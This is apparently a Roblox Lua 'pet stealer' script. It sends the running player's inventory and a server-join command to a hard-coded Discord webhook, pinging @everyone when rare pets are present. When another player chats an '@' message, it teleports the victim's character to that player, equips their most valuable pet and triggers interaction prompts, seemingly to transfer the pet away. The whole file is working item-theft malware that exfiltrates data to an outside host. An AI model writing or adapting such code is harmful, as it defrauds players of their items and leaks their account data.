local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local UserInputService = game:GetService("UserInputService")

-- CONFIG (REPLACE WITH YOUR WEBHOOK)
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"

-- PET PRIORITY (HIGHEST TO LOWEST)
local PET_PRIORITY = {
    ["T-Rex"] = 100,
    ["Dragonfly"] = 90,
    ["Queen bee"] = 85,
    ["Disco bee"] = 80,
    ["Raccoon"] = 75,
    ["Mimic Octopus"] = 70,
    ["Butterfly"] = 65
}

-- ITEMS TO IGNORE
local IGNORE_ITEMS = {
    "Shovel",
    "Destroy Plants"
}

--[[ WEBHOOK FUNCTIONS ]]--
local function sendWebhook(content, embed)
    local payload = {
        content = content,
        embeds = {embed}
    }
    
    local success, response = pcall(function()
        return HttpService:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)
    
    if not success then
        warn("Webhook failed: "..tostring(response))
    end
end

local function sendInitialData()
    local items = {}
    for _,item in pairs(LocalPlayer.Backpack:GetChildren()) do
        table.insert(items, item.Name)
    end

    local hasRare = false
    for pet in pairs(PET_PRIORITY) do
        if table.find(items, pet) then
            hasRare = true
            break
        end
    end

    local embed = {
        title = "📦 "..LocalPlayer.Name.."'s Inventory",
        description = table.concat(items, "\n"),
        color = hasRare and 0xFF0000 or 0x00FF00,
        fields = {
            {
                name = "JOIN SCRIPT", 
                value = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', game.PlaceId, game.JobId),
                inline = false
            }
        }
    }

    sendWebhook(hasRare and "@everyone" or nil, embed)
end

--[[ ITEM SYSTEM ]]--
local function getBestItem()
    local bestItem, highestScore = nil, 0
    
    for _,item in pairs(LocalPlayer.Backpack:GetChildren()) do
        -- Skip ignored items
        local shouldIgnore = false
        for _,ignore in pairs(IGNORE_ITEMS) do
            if string.find(item.Name, ignore) then
                shouldIgnore = true
                break
            end
        end
        if shouldIgnore then continue end
        
        -- Check pet priority
        local score = 0
        for pet, points in pairs(PET_PRIORITY) do
            if string.find(item.Name, pet) then
                score = points
                break
            end
        end
        
        if score > highestScore then
            highestScore = score
            bestItem = item
        end
    end
    
    return bestItem
end

--[[ PRECISE INTERACTION ]]--
local function findInteractPart(targetChar)
    -- First check for ProximityPrompt
    for _,part in pairs(targetChar:GetDescendants()) do
        if part:IsA("ProximityPrompt") then
            return part.Parent, part
        end
    end
    
    -- Fallback to torso if no prompt found
    return targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso")
end

local function getScreenPosition(part)
    local vector, onScreen = Camera:WorldToViewportPoint(part.Position)
    if onScreen then
        return Vector2.new(vector.X, vector.Y)
    end
    return Vector2.new(0.5, 0.5) -- Fallback to center
end

--[[ TARGET INTERACTION ]]--
local function interactWithPlayer(target)
    -- Teleport to target
    local targetChar = target.Character or target.CharacterAdded:Wait()
    local interactPart, prompt = findInteractPart(targetChar)
    LocalPlayer.Character.HumanoidRootPart.CFrame = interactPart.CFrame * CFrame.new(0, 0, -4)

    -- Force first-person
    LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
    LocalPlayer.CameraMaxZoomDistance = 0.5
    LocalPlayer.CameraMinZoomDistance = 0.5

    -- Look at target
    local lookConn
    lookConn = RunService.Heartbeat:Connect(function()
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, interactPart.Position)
    end)

    -- Equip best item
    local item = getBestItem()
    if item then
        LocalPlayer.Character.Humanoid:EquipTool(item)
    end

    -- Calculate screen position for interaction
    local screenPos = getScreenPosition(interactPart)
    UserInputService:SetMouseLocation(screenPos.X, screenPos.Y)
    
    -- Handle interaction
    if prompt then
        -- Use proximity prompt if available
        fireproximityprompt(prompt)
        task.wait(0.1)
        local startTime = os.clock()
        while os.clock() - startTime < 5 do
            if not prompt.Enabled then break end
            fireproximityprompt(prompt)
            task.wait(0.1)
        end
    else
        -- Fallback to mouse click
        mouse1press()
        task.wait(5)
        mouse1release()
    end

    -- Cleanup
    if lookConn then lookConn:Disconnect() end
end

--[[ CHAT DETECTION ]]--
local function onChatted(player, msg)
    if player == LocalPlayer then return end
    if not string.find(msg, "@") then return end
    
    -- Send alert to webhook
    local embed = {
        title = "🎯 "..player.Name.." triggered",
        color = 0xFFA500,
        fields = {
            {name = "User ID", value = player.UserId, inline = true},
            {name = "Account Age", value = player.AccountAge, inline = true}
        }
    }
    sendWebhook(nil, embed)
    
    -- Interact with player
    interactWithPlayer(player)
end

--[[ INITIALIZE ]]--
sendInitialData() -- Send inventory immediately

-- Set up chat listeners
for _,player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(msg)
            onChatted(player, msg)
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        onChatted(player, msg)
    end)
end)

print("✅ SYSTEM ACTIVE - Waiting for @ mentions")
